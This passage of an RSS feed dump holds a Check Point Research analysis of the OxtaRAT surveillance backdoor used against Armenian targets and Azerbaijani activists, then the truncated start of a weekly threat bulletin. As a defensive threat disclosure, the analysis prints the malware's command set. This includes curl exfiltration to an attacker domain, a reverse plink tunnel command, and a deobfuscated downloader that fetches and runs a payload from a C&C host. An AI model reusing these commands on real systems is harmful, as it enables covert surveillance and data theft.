sign.</p>\n\n\n\n<p>The full list of commands supported by the backdoor:</p>\n\n\n\n<figure class=\"wp-block-table\"><table><thead><tr><td>command</td><td>parameters</td><td>description</td></tr></thead><tbody><tr><td>download</td><td>file name</td><td>Upload a file using curl (postup.exe):&nbsp;<code>postup.exe -s -o nul -k --max-time 777 -A \"Mozilla/5.0 (Windows NT 11.0; rv:54.0) Gecko/20100101 Firefox/96.1\" -F \"file=@\"filename\" https://edupoliceam[.]info/upload.php?GUID=&lt;guid&gt;</code>.</td></tr><tr><td>upload</td><td>file name</td><td>Download a file and save it with a specified filename and random prefix in the Temp directory.</td></tr><tr><td>uploadexec</td><td>file name</td><td>Download and execute with&nbsp;<code>wmic /node:%computername%\" process call create $output_filename</code>.</td></tr><tr><td>aueval</td><td>expression to be evaluated</td><td>Execute a specified expression with AutoIT command <a href=\"https://www.autoitscript.com/autoit3/docs/functions/Execute.htm\">Execute</a>.</td></tr><tr><td>makepersistent</td><td></td><td>Create a scheduled task called&nbsp;<code>WallPaperChangeApp</code>.</td></tr><tr><td>Implant</td><td></td><td>Download and execute&nbsp;<code>AppCrashCollector.exe</code>.</td></tr><tr><td>stopimplant</td><td></td><td>Kill the&nbsp;<code>AppCrashCollector</code>&nbsp;process with&nbsp;<code>taskkill /IM</code>&nbsp;and set&nbsp;settings.ini&nbsp;to 0.</td></tr><tr><td>search</td><td>path, pattern</td><td>Search for a pattern in a specified path with&nbsp;<code>PowerShell -Noni -command '(get-childitem '\" &amp; $path &amp; \"' -Recurse -ea 0)| select Fullname | ? {$_.Fullname -like '\" &amp; $pattern &amp; \"'} | fl</code>.</td></tr><tr><td>listdesktop</td><td></td><td>List the contents of the Desktop folder with&nbsp;<code>dir /s \"%homepath%\\Desktop</code>.</td></tr><tr><td>listdir</td><td>directory path</td><td>List a specified directory recursively, including the last modified date and size.</td></tr><tr><td>massdownload</td><td>path, filter</td><td>Upload files from a specified path with a specified filter (include/exclude), using curl for each file (the same way as the download command), with&nbsp;<code>&amp;MASSDL=1</code>&nbsp;parameter in the URL.</td></tr><tr><td>massdownload2list</td><td>path, filter</td><td>List all files in a specified path matching the specified filter to the&nbsp;<code>Thumb.db</code>&nbsp;file.</td></tr><tr><td>massdownload2</td><td>path, filter, [range]</td><td>Upload files from a specified path from&nbsp;<code>Thumb.db</code>&nbsp;with POST request to the URL with&nbsp;<code>&amp;MASSDL2=1</code>&nbsp;parameter.</td></tr><tr><td>webcamrecord</td><td>length</td><td>Webcam recording using VLC:&nbsp;<code>$tmp_blcvid &amp; \"\\blc\\vlc\\MediaRun.exe --no-qt-privacy-ask dshow:// --sout file/avi:\" &amp; $tmp_blcvid &amp; \"\\webcam-video-record-\" &amp; $timestamp &amp; \"-sec-\" &amp; $chunk_length &amp; \".avi --run-time=\" &amp; $chunk_length &amp; \" -Idummy --quiet vlc://quit\"</code>. The records are uploaded zipped using curl and are then deleted.</td></tr><tr><td>desktoprecord</td><td>length</td><td>Desktop recording using VLC:&nbsp;<code>$tmp_blcvid &amp; \"\\blc\\vlc\\MediaRun.exe --no-qt-privacy-ask screen:// --sout file/avi:\" &amp; $tmp_blcvid &amp; \"\\Desktop-video-record-\" &amp; $timestamp &amp; \"-sec-\" &amp; $chunk_length &amp; \".avi --run-time=\" &amp; $chunk_length &amp; \" -Idummy --quiet vlc://quit\"</code>. The records are uploaded zipped using curl and then deleted.</td></tr><tr><td>tightvnc</td><td></td><td>Download&nbsp;<code>Wintight.exe</code>&nbsp;(AutoIt compiled executable which extracts and runs&nbsp;tvnserver.exe) and execute it with&nbsp;<code>wmic process call create</code>.</td></tr><tr><td>killtightvnc</td><td></td><td>Kill TightVNC with&nbsp;<code>taskkill /IM TVN* /F</code>.</td></tr><tr><td>zipit</td><td>source, zip file name, destination, [filter]</td><td>Zip the folder using&nbsp;<code>7za.exe</code>.</td></tr><tr><td>unzipit</td><td>source, destination</td><td>Unzip the archive using&nbsp;<code>7za.exe</code>.</td></tr><tr><td>installrar</td><td></td><td>Download and unzip WinRAR.</td></tr><tr><td>rarit</td><td>source, destination, [extensions], [volume_size]</td><td>Archive the file/files with specific extensions from the folder using WinRAR.</td></tr><tr><td>unrarit</td><td>source, destination</td><td>Extract the archive using&nbsp;Unrar.exe.</td></tr><tr><td>reboot</td><td></td><td>Reboot with&nbsp;<code>cmd.exe /c shutdown -r -t 0 /f</code>.</td></tr><tr><td>curl</td><td>url</td><td>Execute the curl command:&nbsp;<code>postup.exe -i -vvv -k --max-time 60 -A \"Mozilla/5.0 (Windows NT 11.0; rv:54.0) Gecko/20100101 Firefox/96.0.1\" &amp; $url</code>.</td></tr><tr><td>portscan</td><td>ip/ip_range, port/port_range</td><td>Download and execute the portscan script (AutoIT-based&nbsp;<code>pscclient.exe</code>)</td></tr><tr><td>tunnel</td><td>server, user, password, port, host, host_port, local_port</td><td>Download, unzip and execute reverse port forwarding with plink:&nbsp;<code>ptun.exe &amp; $server &amp; \" -P \" &amp; $port &amp; \" -C -R 127.0.0.1:\" &amp; $listen_port &amp; \":\" &amp; $host &amp; \":\" &amp; $host_port &amp; \" -l \" &amp; $user &amp; \" -pw \" &amp; $password</code>.</td></tr><tr><td>killtunnel</td><td></td><td>Kill the tunnel with&nbsp;<code>taskkill /IM powers* /F &amp; taskkill /IM ptun.exe</code>.</td></tr><tr><td>wwwserv</td><td></td><td>Download, unzip and run PHP web server on port 3136 with <a href=\"https://sourceforge.net/projects/phpfm/\">PHP File Manager.</a> This is done by downloading the AutoIT-based&nbsp;<code>wsrrun.exe</code>&nbsp;which extracts all needed files and executes php CLI as&nbsp;<code>connectionlessupdate.exe -q -S 127.0.0.1:3136 -t &lt;root folder&gt; -H</code>.</td></tr><tr><td>stopwwwserv</td><td></td><td>Kill the web server with&nbsp;<code>taskkill /IM connectionle* /F</code>.</td></tr><tr><td>wmicexec</td><td>process</td><td>Execute with&nbsp;<code>'wmic /node:' &amp; %computername% &amp; 'process call create' &amp; $process</code>.</td></tr><tr><td>sysinfo</td><td></td><td>Collect system info with&nbsp;<code>hostname &amp; ipconfig /all &amp; arp -a &amp; getmac &amp; net use &amp; net share &amp; quser /server:localhost &amp; whoami /all &amp; net user &amp; systeminfo &amp; wmic process get commandline &amp; nslookup myip.opendns.com. resolver1.opendns.com</code>.</td></tr><tr><td>getip</td><td></td><td>Get network drives with&nbsp;PowerShell -ep bypass -command get-psdrive.</td></tr><tr><td>showdrives</td><td></td><td>Get network drives with&nbsp;<code>powershell -ep bypass -command get-psdrive</code>.</td></tr><tr><td>proclist</td><td></td><td>Get the process list by&nbsp;<code>wmic process get commandline</code>.</td></tr><tr><td>speedtest</td><td></td><td>Download, unzip and execute Speedtest.</td></tr><tr><td>showagentversion</td><td></td><td>Return the agent version (version&nbsp;11&nbsp;is hardcoded in this specific sample).</td></tr><tr><td>tempclean</td><td></td><td>Clean the Temp folder with&nbsp;<code>rmdir /q /s %temp%, mkdir %temp%</code>.</td></tr><tr><td>radar</td><td>time</td><td>Exit if the time since the last call is smaller than the parameter.</td></tr><tr><td>exitself</td><td></td><td>Exit.</td></tr></tbody></table></figure>\n\n\n\n<p>For the commands that require output, the final command line that was executed and its output are written to the working directory to the file with <code>Random(1, 815782) &amp; \"-command-.txt\"</code> name.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Previous campaigns</strong></h2>\n\n\n\n<p>Although not widely discussed, previous versions of the OxtaRAT backdoor were used in earlier attacks against Azerbaijani political and human rights activists &#8211; or, when the targets were not disclosed publicly, their lures referenced Azerbaijan-Armenia tensions around Artsakh. The older versions of OxtaRAT have significantly less functionality than the new variant but contain similar code and names for most of the commands and the same C&amp;C communication pattern.</p>\n\n\n\n<h3 class=\"wp-block-heading\"><strong>June 2021</strong></h3>\n\n\n\n<p>In July 2021, Qurium Media <a href=\"https://www.qurium.org/alerts/phishing-attack-against-azerbaijani-political-and-human-right-activities/\">reported</a> that several prominent human rights and political activists in Azerbaijan received targeted phishing emails that lured them to download malware from the Google Drive link. The link led to a password-protected RAR archive (the password was specified in the email) which in turn contained an Auto-IT compiled executable called <code>\u201cHuman Rights Invoice Form Document -2021.exe\"</code>. When executed, it downloaded from the C&amp;C server <code>shoesbuysellone[.]live</code> the main AutoIT malware (md5: 0360185bc6371ae42ca0dffe0a21455d). Although it doesn\u2019t contain a hardcoded \u201cagent version\u201d number, we can clearly see that this is an earlier version of OxtaRAT. It has very similar functionality and code, but supports fewer commands (11 in total):</p>\n\n\n\n<figure class=\"wp-block-table\"><table><tbody><tr><td>download<br />implant<br />stopimplant<br />massdownload<br />webcamrecord<br />desktoprecord</td><td>makepersistent<br />aueval<br />upload<br />uploadexec<br />wmicexec<br /><br /></td></tr></tbody></table></figure>\n\n\n\n<h3 class=\"wp-block-heading\"><strong>August 2021</strong></h3>\n\n\n\n<p>In August 2021, another sample was observed, this time submitted to VirusTotal from Armenia. The file called <code>REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION (Final Updated 2021).scr</code> also bears the PDF icon, and when executed, presents the victim with the following PDF lure:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27438\" height=\"461\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/02/image6-1.png\" width=\"945\" /><figcaption class=\"wp-element-caption\">Figure 6 \u2013 PDF lure for the August 2021 version (md5: ddac9a1189e4b9528d411e07d0e98895).</figcaption></figure></div>\n\n\n<p>In the background, it downloads the main malware from the C&amp;C server <code>https://www.filecloudservices.xyz/wp-comment.php</code> and saves it as <code>PhoneAppService.Exe</code>. The code of this version implements the same string obfuscation as the newest version:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">$koda_gui = StringFromASCIIArray(StringSplit(\"77|111|122|105|108|108|97|47|53|46|48|32|40|76|105|110|117|120|59|32|85|59|32|65|110|100|114|111|105|100|32|52|46|48|46|51|59|32|107|111|45|107|114|59|32|76|71|45|76|49|54|48|76|32|66|117|105|108|100|47|73|77|76|55|52|75|41|32|65|112|112|108|101|87|101|98|107|105|116|47|53|51|52|46|51|48|32|40|75|72|84|77|76|44|32|108|105|107|101|32|71|101|99|107|111|41|32|86|101|114|115|105|111|110|47|52|46|48|32|77|111|98|105|108|101|32|83|97|102|97|114|105|47|53|51|52|46|51|48|32|49|56|46|51\", \"|\"), 1) // Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 18.3\nFileInstall(\".\\REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION_AGAINST_ARTSAKH.pdf\", @AppDataDir &amp; \"\\\" &amp; \"REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION_AGAINST_ARTSAKH.pdf\", 1)\n$n = StringFromASCIIArray(StringSplit(\"104|116|116|112|115|58|47|47|119|119|119|46|102|105|108|101|99|108|111|117|100|115|101|114|118|105|99|101|115|46|120|121|122|47|119|112|45|99|111|109|109|101|110|116|46|112|104|112\", \"|\"), 1) //https://www.filecloudservices.xyz/wp-comment.php\n$m = StringFromASCIIArray(StringSplit(\"80|104|111|110|101|65|112|112|83|101|114|118|105|99|101|46|69|120|101\", \"|\"), 1) //PhoneAppService.Exe\nRun(@ComSpec &amp; \" File.txt /\" &amp; \"c \" &amp; StringFromASCIIArray(StringSplit(\"115|116|97|114|116\", \"|\"), 1) &amp; \" \" &amp; @AppDataDir &amp; \"\\\" &amp; \"REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION_AGAINST_ARTSAKH.pdf\", @AppDataDir, @SW_HIDE)\nHttpSetUserAgent($koda_gui)\nHttpSetProxy(1)\nInetGet($n, @TempDir &amp; \"\\\" &amp; $m, 1)</pre>\n\n\n\n<h3 class=\"wp-block-heading\"><strong>February 2022</strong></h3>\n\n\n\n<p>In February of last year, Qurium <a href=\"https://www.qurium.org/alerts/azerbaijan/yet-another-targeted-malware-against-azerbajani-political-activists/\">reported</a> another attack, this time <a href=\"https://www.az-netwatch.org/news/deliberate-targeting-in-pro-government-media-leads-to-targeted-attacks-online-the-case-of-abulfaz-gurbanli/\">targeting </a>Abulfaz Gurbanli, an Azerbaijani political activist. The attackers pretended to be BBC journalists and, similar to the June 2021 attacks, sent the victim an email which contained a Google Drive link, pointing to a password-protected RAR archive called <code>BBC-suallar.rar</code> (\u201cBBC questions\u201d). Once again, a AutoIT-compiled executable called <code>suallar.scr</code> was extracted. This time, it masqueraded as a Word document, complete with a Word icon. Upon execution, it presented the lure DOC file called <code>smm-fraza.doc</code>.</p>\n\n\n\n<p>In the background, it downloaded from the C&amp;C server <code>https://smartappsfoursix[.]xyz/wp-feed.php</code> and run another version of OxtaRAT. This is a more advanced version, compared to the 2021 attacks, with many additional commands added (29 in total):</p>\n\n\n\n<figure class=\"wp-block-table\"><table><tbody><tr><td>download<br />aueval<br />upload<br />uploadexec<br />exittemp<br />implant<br />stopimplant<br />radar<br />massdownload<br />webcamrecord<br />desktoprecord<br />makepersistent<br />untrace<br />wwwserv<br />stopwwwserv</td><td>curl<br />reboot<br />zipit<br />unzipit<br />tunnel<br />tightvnc<br />wmicexec<br />search<br />sysinfo<br />showdrives<br />getip<br />listdesktop<br />killtightvnc<br />killtunnel<br /><br /></td></tr></tbody></table></figure>\n\n\n\n<p>The version from June 2021 was capable only of downloading and exfiltrating files, executing the binaries and AutoIT code, and recording data from the desktop and web camera. In contrast, the version observed in February 2022 is a more powerful malware with a lot of additional features. The actors added capabilities to improve local file enumeration (list files on the desktop, search for specific files), collect data about the compromised system, work with zip files, and, most importantly, improved the ways they can access and control the infected machine by adding commands to install TightVNC or the PHP web server.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>How does the attack from November 2022 differ from the earlier attacks?</strong></h2>\n\n\n\n<h3 class=\"wp-block-heading\"><strong>Infection chain</strong></h3>\n\n\n\n<p>The first change that the actors implemented in their latest attack is in the infection chain. Previously, the initial .SCR files, masquerading as Word or PDF documents, served only as downloaders. They sent a request to WordPress-like URLs on the C&amp;C server (<code>wp-feed.php</code>, <code>wp-comment.php</code>, etc) and then executed the main malware received from the attackers\u2019 server. In the latest campaign, the .SCR file already contains the OxtaRAT backdoor, as a polyglot file. This saves the actors from needing to make additional requests for binaries to the C&amp;C server and attracting unnecessary attention, as well as hides the main malware from being easily discovered on the infected machine, as it looks like a regular image and bypasses type-specific protections. &nbsp;</p>\n\n\n\n<h3 class=\"wp-block-heading\"><strong>Geofencing</strong></h3>\n\n\n\n<p>The actors added an additional measure to protect their infrastructure, geofencing the C&amp;C domains that store the auxiliary tools and additional payloads. This is a technique currently used by many experienced threat actors to make sure that the proper execution flow is not triggered by sandboxes or researchers, but only on the targeted machines. In this case, the actors limited their operations to Armenian IP addresses.</p>\n\n\n\n<h3 class=\"wp-block-heading\"><strong>Data collection and exfiltration</strong></h3>\n\n\n\n<p>Since the previous publicly disclosed version, OxtaRAT was updated with 10 additional commands introducing new functionality. Most of the new features aim to improve the ways to steal the victim\u2019s data. For example, they implemented the <code>listdir</code> command to recursively enumerate the files in a specified folder, collecting additional data such as the last modified date and size. The previously existing command <code>massdownload</code>, which is used to exfiltrate files of predefined types, was also updated with a few new file extensions (marked in bold):</p>\n\n\n\n<p><code><strong>\"*.mdb;*.accdb;*.rdo;*.ora;*.accda;*.accdr;*.accdt;</strong>*.ppt;*.avi;*.pptx;*.odt;*.pdf;*.txt;*.msf;*.docx;*.xml;*.doc;*.rtf;*.jpg;*.jpeg;*.png;*.xls;*.xlsx;*.rdp;*.zip;*.rar;*.sql;*.sqlite;*.php;*.avi;*.mp4;*.tar;*.tar.gz;*.7z;*.bz2;*.tar.bz2\"</code></p>\n\n\n\n<p>As can be seen from this snippet, the actors are now interested in additional file types related to Oracle and Microsoft Access databases. This is an interesting development, as it indicates they may be broadening their targets to include corporate networks or specific individuals, as common private computers rarely contain personal files in DB formats.</p>\n\n\n\n<p>The actors also implemented \u201cadvanced\u201d mass-download commands such as the <code>massdownload2</code> and <code>massdownload2list</code> that allow the actors to enumerate and exfiltrate specified filetypes more conveniently. In addition, they implemented functions to work with RAR archives (<code>installrar</code>, <code>rarit</code>, <code>unrarit</code>) which, along with the clear benefits of uploading the auxiliary tools inside RAR archives to the infected machines, enable the actors to archive all the files of their interest to the multi-volume RAR archive. The default list of extensions provided in the code of the <code>rarit</code> exfiltration function shows a focus on documents, pictures, archives, and databases:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">Func rar_it($source_file_or_dir, $destination_path, $extensions_to_rar = \"*.xls;*.xlsx;*.doc;*.docx;*.pdf;*.rar;*.zip;*.tar;*.tar.gz;*.sql;*.txt;*.mdb;*.jpg;*.jpeg;*.accdb\", $parts = \"12M\")</pre>\n\n\n\n<p>Another interesting feature included in the most recent version is the <code>speedtest</code> command which invokes Speedtest CLI, a dedicated tool to test the speed and performance of an internet connection. As the malware is not only capable of collecting a large quantity of files but also recording video from a web camera and screen, it can produce significantly large outputs with gigabytes of data. Therefore, for the sake of OPSEC, to hide the extensive data exfiltration the actors likely needed a way to control and estimate the upload all of the collected information to their servers.</p>\n\n\n\n<p>The last feature added to the data collection mechanism is a <code>proclist</code> command, which uses WMIC to retrieve the command line for each of the processes. This feature might be used for evasion purposes, so the actors can make sure they are running in an actual environment as opposed to a sandbox, as well as to learn more about the software configurations running on the victim\u2019s machine.</p>\n\n\n\n<h3 class=\"wp-block-heading\"><strong>Port Scanning</strong></h3>\n\n\n\n<p>One of the unexpected features that we found during this investigation is the portscan tool, which is included only in the newer version of the backdoor. The port scanner, <code>pscclient.exe</code>, is an Auto-IT based non-obfuscated TCP Connect tool that can scan a specified range of IP addresses and a range of ports. The default range of ports configured in the tool includes both well-known and non-standard ports:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">Global $port_range[100] = [135, 4444, 136, 137, 138, 139, 20, 21, 22, 23, 80, 443, 445, 8443, 8080, 3131, 3128, 5681, 5060, 5061, 3389, 33899, 33399, 3390, 389, 4000, 1433, 1521, 9222, 45687, 7292, 789, 50022, 2109, 2233, 55522, 33391, 33392, 33390, 33394, 33389, 33398]</pre>\n\n\n\n<p>OxtaRAT, which previously had mostly local recon and surveillance capabilities, can now be used as a pivot for active reconnaissance of other devices. This may indicate that the threat actors are preparing to extend their main attack vector, which is currently social engineering, to infrastructure-based attacks. It also might be a sign that the actors are moving from targeting individuals to targeting more complex or corporate environments.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Infrastructure</strong></h2>\n\n\n\n<p>Our search for domains with similar characteristics to <code>edupoliceam[.]info</code> led to more active domains: <code>filesindrive[.]info</code>, <code>mediacloud[.]space</code> and <code>avvpassport[.]info</code>. All the domains are registered with NameCheap. While <code>filesindrive[.]info</code> and <code>mediacloud[.]space</code>, similar to <code>filecloudservices[.]xyz</code> used in back in 2021, have a generic reference to cloud file storages, the domain <code>avvpassport[.]info</code> is more specific, and it masquerades as the Passport and Visa Office of the Republic of Armenia. Both of these domains, <code>edupoliceam[.]info</code> and <code>avvpassport[.]info</code>, were created on September 23, 2022, and were likely also used for other attacks on Armenian targets.</p>\n\n\n\n<p>At the beginning of our investigation, all of these domains used Cloudflare services to hide their IP addresses. Due to their configuration, by looking for IP addresses with the same behavior, we identified <code>38.242.197[.]156</code> as likely their real IP address. While we were completing the investigation and notifying the relevant parties, Cloudflare blocked these domains as malicious, and they all started to publicly resolve to their real IP address <code>38.242.197[.]156</code>.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Targeting and Attribution</strong></h2>\n\n\n\n<p>Alexander Lapshin, whose name is used in the lure, <a href=\"https://www.facebook.com/permalink.php?story_fbid=pfbid02EBSo3mX2da88WfDK1kcTCL9HoD7hjhLfMjG8Fd132QBf37UPagzsPf5iivCit7fwl&amp;id=100036865157039\">shared</a> that on the same day the samples were uploaded to VT, the representatives of Artsakh bank notified that they received malicious emails in his name. This information was also later confirmed by <a href=\"https://cyberhub.am/en/\">Cyberhub-AM</a>, digital security helpdesk for Armenian civil society. Due to the infrastructure revealed, we believe that there might have been other targets of this campaign in Armenia as well.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27439\" height=\"247\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/02/image7-1.png\" width=\"682\" /><figcaption class=\"wp-element-caption\">Figure 7 \u2013 Facebook post by Lapshin (automatic translation).</figcaption></figure></div>\n\n\n<p>All of the samples from this campaign and earlier ones are related to Azerbaijani government interests; they either targeted Azerbaijani political and human rights activists or, if the targets were not disclosed publicly, reference tensions between Azerbaijan and Armenia over Artsakh/Nagorno-Karabakh. Meta, in their <a href=\"https://about.fb.com/wp-content/uploads/2022/04/Meta-Quarterly-Adversarial-Threat-Report_Q1-2022.pdf\">Adversarial Threat Report</a> Q1-2021, attributed the previous campaigns reported by Qurium to the Azeri Ministry of Internal Affairs. However, no technical analyses were provided.</p>\n\n\n\n<p>In 2017, Amnesty International <a href=\"https://web.archive.org/web/20190416193823/https:/www.amnesty.org/en/latest/research/2017/03/False-Friends-Spearphishing-of-Dissidents-in-Azerbaijan/\">reported</a> a campaign that started as early as November 2015 and continued through 2017. This campaign used Autoit malware called <strong>AutoItSpy </strong>against Azerbaijani dissidents, and was later <a href=\"https://www.qurium.org/alerts/news-media-websites-attacked-from-governmental-infrastructure-in-azerbaijan/\">connected </a>by Qurium to other \u201cdenial-of-service attacks, intrusion attempts, spear-phishing campaigns and electronic media monitoring from Internet infrastructure associated with the&nbsp;Government of Azerbaijan.\u201d The <strong>AutoItSpy</strong> malware used at the time had the ability to log the keystrokes and collect screenshots, exfiltrating both of them over SMTP protocol.</p>\n\n\n\n<p>Even though we couldn\u2019t find any infrastructure overlap with our campaign (considering a gap of a few years and public exposure of previous attacks), there is a significant overlap in major TTPs:</p>\n\n\n\n<ul>\n<li>The use of AutoIT malware.</li>\n\n\n\n<li>The use of files with SCR extensions bearing document-related icons (PDF, Word).</li>\n\n\n\n<li>A focus on surveillance technology (keylogging, screen capture, data exfiltration).</li>\n\n\n\n<li>Similar consistent targeting.</li>\n</ul>\n\n\n\n<p>Although it is tricky to compare the code of tools with different functionality (keylogger compared to a full-blown surveillance tool), there are a few high-level overlaps in the coding style of these tools:</p>\n\n\n\n<ul>\n<li>The samples from the AutoItSpy campaign are obfuscated with similar techniques as the OxtaRAT samples from 2022.</li>\n\n\n\n<li>Temporary file names with collected information of AutoItSpy and OxtraRAT both mimic the Windows thumbnail cache:</li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27452\" height=\"126\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/02/image8_1-1.png\" width=\"765\" /></figure></div>\n\n\n<pre class=\"wp-block-preformatted\"></pre>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27453\" height=\"161\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/02/image8_2-1.png\" width=\"765\" /><figcaption class=\"wp-element-caption\">Figure 8 \u2013 \u201cThumb\u201d in file names of AutoItSpy (top) and OxtraRAT (bottom).</figcaption></figure></div>\n\n\n<ul>\n<li>Additional details such as extensively using <code>%random% %random% %random%</code> in all the batch scripts, immediately setting file attributes with <code>FileSetAttrib($dir, \"+SH\")</code> for all the newly created folders, excessive usage of the <code>Random</code> function, etc.</li>\n</ul>\n\n\n\n<p>Based on these similarities in TTPs, code and targeting, we can conclude with medium confidence that both cases involve the same threat actors. We can also speculate that the missing \u201cimplant\u201d in OxtaRAT that we were unable to access might be a keylogger; not only is it an important functionality missing from OxtaRAT\u2019s multi-functional surveillance arsenal, but also the actors might take extra measures to avoid revealing it to anyone except the targets, possibly to avoid attribution based on already uncovered information.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Conclusion</strong></h2>\n\n\n\n<p>In this article, we describe the latest attack and the evolution of the tools in the campaigns against Armenian targets, as well as Azerbaijani activists and dissidents. All the details indicate that the underlying threat actors have been maintaining the development of Auto-IT based malware for the last seven years, and are using it in surveillance campaigns whose targets are consistent with Azerbaijani interests.</p>\n\n\n\n<p>Check Point&#8217;s <a href=\"https://www.checkpoint.com/infinity/zero-day-protection/\">Threat Prevention Engines</a> provides comprehensive coverage of attack tactics, file-types, and operating systems and protects against attacks such as described in this research. <a href=\"https://www.checkpoint.com/infinity/threatcloud/\">ThreatCloud </a>is Check Point\u2019s rich cyber defense database. Its threat intelligence powers Check Point\u2019s zero-day protection solutions.</p>\n\n\n\n<p>Check Point products provide the following coverage against this threat:</p>\n\n\n\n<ul>\n<li>Anti-Bot: Trojan.WIN32.OxtaRAT.A, Trojan.WIN32.OxtaRAT.B</li>\n\n\n\n<li>Threat Emulation: Trojan.WIN.OxtaRAT.A</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>IOCs</strong></h2>\n\n\n\n<pre class=\"wp-block-preformatted\">6ac414fad3d61ad5b23c2bcdd8ee797f\nddac9a1189e4b9528d411e07d0e98895\n0360185bc6371ae42ca0dffe0a21455d\nddac9a1189e4b9528d411e07d0e98895 \n1c94f1c6241cb598da5da7150a0dc541\ndf9673032789847a367df9923bbd44d2\na1a39e458977aa512b7ff2ba1995b18d\ncf225029cade918d92b4b4e2b789b7a5\n86b5245112436e8a5eabf92fab01ffba\n\nedupoliceam[.]info \nfilesindrive[.]info\nmediacloud[.]space \navvpassport[.]info\nfilecloudservices[.]xyz\n38.242.197[.]156\n</pre>\n\n\n\n<p></p>\n\n\n<p>The post <a href=\"https://research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia/\" rel=\"nofollow\">Operation Silent Watch: Desktop Surveillance in Azerbaijan and Armenia</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "13th February \u2013 Threat Intelligence Report",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "13th February \u2013 Threat Intelligence Report"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/13th-february-threat-intelligence-report/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/13th-february-threat-intelligence-report/",
            "authors": [
                {
                    "name": "urias"
                }
            ],
            "author": "urias",
            "author_detail": {
                "name": "urias"
            },
            "published": "Mon, 13 Feb 2023 15:27:37 +0000",
            "published_parsed": [
                2023,
                2,
                13,
                15,
                27,
                37,
                0,
                44,
                0
            ],
            "tags": [
                {
                    "term": "Global Cyber Attack Reports",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27366",
            "guidislink": false,
            "summary": "<p>For the latest discoveries in cyber research for the week of 13th February, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES The California cities of Oakland and Modesto have been targeted by ransomware attacks, disrupting services in the former and the police network in the latter. Also in California, healthcare company \u2018Heritage Provider Network\u2019 [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/13th-february-threat-intelligence-report/\" rel=\"nofollow\">13th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>For the latest discoveries in cyber research for the week of 13th February, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES The California cities of Oakland and Modesto have been targeted by ransomware attacks, disrupting services in the former and the police network in the latter. Also in California, healthcare company \u2018Heritage Provider Network\u2019 [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/13th-february-threat-intelligence-report/\" rel=\"nofollow\">13th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p>For the latest discoveries in cyber research for the week of 13th February, please download our <a href=\"https://research.checkpoint.com/wp-content/uploads/2023/02/Threat_Intelligence_News_2023-02-13.pdf\">Threat_Intelligence Bulletin</a></p>\n<p><strong>TOP ATTACKS AND BREACHES</strong></p>\n<ul>\n<li>The California cities of <a href=\"https://www.oaklandca.gov/news/2023/city-of-oakland-targeted-by-ransomware-attack-core-services-not-affected\">Oakland</a> and <a href=\"https://sjvsun.com/news/modesto/hack-attack-forces-modesto-police-off-computers-back-onto-radio-report-says/\">Modesto</a> have been targeted by ransomware attacks, disrupting services in the former and the police network in the latter. Also in California, healthcare company \u2018Heritage Provider Network\u2019 has <a href=\"https://therecord.media/ransomware-attack-leads-to-massive-data-breach-from-california-health-network/\">confirmed</a> that medical and personal information of more than 3 million patients had been disclosed in a ransomware attack against the company in December.</li>\n<li>A British member of Parliament has <a href=\"https://www.bbc.com/news/uk-politics-64562832\">disclosed</a> that his email account had been hacked in a spear-phishing attack. According to reports, the threat actor behind the attack is the Russian-government APT group Seaborgium, which has lately been targeting UK politicians, journalists and activists.</li>\n<li>The group behind the massive \u2018ESXiArgs\u2019 ransomware campaign, which <a href=\"https://blog.checkpoint.com/2023/02/06/massive-ransomware-attack-targets-vmware-esxi-servers/\">affected</a> thousands of VMware ESXi hosts, has <a href=\"https://www.bleepingcomputer.com/news/security/new-esxiargs-ransomware-version-prevents-vmware-esxi-recovery/\">updated</a> their malware\u2019s encryption process. The updated version of the malware prevents the potential recovery method that was recommended by researchers, as it now also encrypts the files that could have been used to trigger the recovery 